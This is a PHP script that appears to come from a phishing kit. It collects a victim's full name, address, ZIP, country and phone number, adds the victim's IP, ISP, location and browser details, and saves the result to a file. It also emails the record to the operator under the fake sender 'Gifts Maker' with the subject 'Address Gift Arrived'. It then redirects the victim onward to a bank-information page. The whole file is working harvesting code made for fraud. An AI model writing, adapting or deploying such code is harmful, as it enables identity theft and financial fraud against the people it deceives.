<?php
error_reporting(0);
ini_set("output_buffering",4096);
@ob_start();
session_start();
session_set_cookie_params(0);

require_once 'inc/functions.php';
require_once 'inc/config.php';

if(!isset($_SESSION['SESSION_ID']))
{
	header("location: index.php");
	exit;
}
$host = bin2hex ($_SERVER['HTTP_HOST']);

$isValidName = false;
$isValidAddress = false;
$isValidCity = false;
$isValidZIP = false;
$isValidCountry = false;
$isValidPhone = false;


if(isset($_POST['name']) && trim($_POST['name']) !== '') {
	$isValidName = true;
	$_SESSION['NAME'] = $_POST['name'];
}


if(isset($_POST['address']) && trim($_POST['address']) !== '') {
	$isValidAddress = true;
	$_SESSION['ADDRESS'] = $_POST['address'];
}

if(isset($_POST['city']) && trim($_POST['city']) !== '') {
	$isValidCity = true;
	$_SESSION['CITY'] = $_POST['city'];
}

if(isset($_POST['state']) && trim($_POST['state']) !== '') {
	$_SESSION['STATE'] = $_POST['state'];
}

if(isset($_POST['zip']) && trim($_POST['zip']) !== '') {
if (strlen($_POST['zip']) > 3) {
		$isValidZIP = true;
	}
	$_SESSION['ZIP'] = $_POST['zip'];
}

if(isset($_POST['country'])) {
	if (strlen($_POST['country']) === 2 && $_POST['country'] !== '--') {
		$isValidCountry = true;
	}
	$_SESSION['COUNTRY'] = $_POST['country'];
}

if(isset($_POST['phone'])) {
	if (strlen($_POST['phone']) > 5) {
		$isValidPhone = true;
	}
	$_SESSION['PHONE'] = $_POST['phone'];
}

if (!$isValidName || !$isValidAddress || !$isValidCity || !$isValidZIP || !$isValidCountry || !$isValidPhone) {
	$errors = true;
} else {
	$errors = false;
}


function build_log_data()
{
	global $nickname;
	
	$ip = isset($_SESSION['IP_INFO']['IP']) ? $_SESSION['IP_INFO']['IP'] : get_client_ip();
	$ip_country = isset($_SESSION['IP_INFO']['IP_COUNTRY']) ? $_SESSION['IP_INFO']['IP_COUNTRY'] : '';
	$ip_isp =  isset($_SESSION['IP_INFO']['IP_ISP']) ? $_SESSION['IP_INFO']['IP_ISP'] : '';
	$ip_org =  isset($_SESSION['IP_INFO']['IP_ORGANIZATION']) ? $_SESSION['IP_INFO']['IP_ORGANIZATION'] : '';
	$ip_city =  isset($_SESSION['IP_INFO']['IP_CITY']) ? $_SESSION['IP_INFO']['IP_CITY'] : '';
	$ip_region =  isset($_SESSION['IP_INFO']['IP_REGION']) ? $_SESSION['IP_INFO']['IP_REGION'] : '';
	$hostname =  isset($_SESSION['IP_INFO']['HOSTNAME']) ? $_SESSION['IP_INFO']['HOSTNAME'] : gethostbyaddr($ip);
	$useragent =  isset($_SESSION['IP_INFO']['USERAGENT']) ? $_SESSION['IP_INFO']['USERAGENT'] : '';
	$referer =  isset($_SESSION['IP_INFO']['REFERER']) ? $_SESSION['IP_INFO']['REFERER'] : '';
	$browser = isset($_SESSION['IP_INFO']['BROWSER']) ? $_SESSION['IP_INFO']['BROWSER'] : '';
	$accept_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
	$user_date = isset($_SESSION['USER_TIME']) ? $_SESSION['USER_TIME'] : '';
	$platform =  isset($_SESSION['IP_INFO']['PLATFORM']) ? $_SESSION['IP_INFO']['PLATFORM'] : '';

	$name = $_SESSION['NAME'];
	$address = $_SESSION['ADDRESS'];
	$city = $_SESSION['CITY'];
	$state = $_SESSION['STATE'];
	$zip = $_SESSION['ZIP'];
	$country = $_SESSION['COUNTRY'];
	$phone = $_SESSION['PHONE'];

	$data = "Full name        : $name\n";
	$data .= "Address          : $address\n";
	$data .= "City             : $city\n";
	$data .= "State            : $state\n";
	$data .= "ZIP              : $zip\n";
	$data .= "Country          : $country\n";
	$data .= "Phone            : $phone\n";
	$data .= "================[IP Info]================\n";
	$data .= "IP               : $ip\n";
	$data .= "Hostname         : $hostname\n";
	$data .= "ISP              : $ip_isp\n";
	$data .= "IP Organization  : $ip_org\n";
	$data .= "IP City          : $ip_city\n";
	$data .= "IP Country       : $ip_country\n";
	$data .= "IP Region        : $ip_region\n";
	$data .= "User-Agent       : $useragent\n";
	$data .= "Browser          : $browser\n";
	$data .= "Platform         : $platform\n";
	$data .= "Referer          : $referer\n";
	$data .= "User Datetime    : $user_date\n";
	$data .= "Accept-Lang      : $accept_lang\n";
	$data .= "================[!~$ Made by $nickname !~$]================\n";

	return $data;
}


if ($errors) {
	$errorStatus = 'name='.(int)$isValidName.'&address='.(int)$isValidAddress.'&city='.(int)$isValidCity.'&zip='.(int)$isValidZIP.'&country='.(int)$isValidCountry.'&phone='.(int)$isValidPhone;
	$errorStatus = base64_encode($errorStatus);
	header("Location: profile.php?error=true&e=".$errorStatus);
} else {

	$data = build_log_data();
	if($save_results_to_text)
	{
		append_to_file($results_address_file, $data);
	}

	if($send_results_to_email)
	{
		$ip = isset($_SESSION['IP_INFO']['IP']) ? $_SESSION['IP_INFO']['IP'] : get_client_ip();
		$ip_country = isset($_SESSION['IP_INFO']['IP_COUNTRY']) ? $_SESSION['IP_INFO']['IP_COUNTRY'] : '';

		$from_name = 'Gifts Maker';
		$from_email = 'no-reply@gifts.io';
		$subject = "Address Gift Arrived [$ip_country - $ip]";
		send_email($recipients, $from_name, $from_email, $subject, $data);
	}

	if(!$disable_bank_info_page)
		header("Location: verify.php?loggedin=true&client=".sha1($_SESSION['SESSION_ID'])."&sessionid=".$host);
	else
		header("Location: validated.php?loggedin=true&client=".sha1($_SESSION['SESSION_ID'])."&sessionid=".$host);
}
ob_end_flush();
?>